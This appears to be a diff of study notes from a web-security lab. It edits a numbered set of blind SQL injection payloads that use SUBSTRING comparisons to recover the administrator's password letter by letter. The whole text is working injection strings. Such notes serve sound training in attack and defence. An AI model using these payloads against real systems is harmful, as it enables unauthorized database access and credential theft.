@@ -3,8 +3,8 @@ first
 …xyz' AND '1'='2
 
 2-)
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) > 'm
 3-)
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) > 't
 4-)
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) = 's
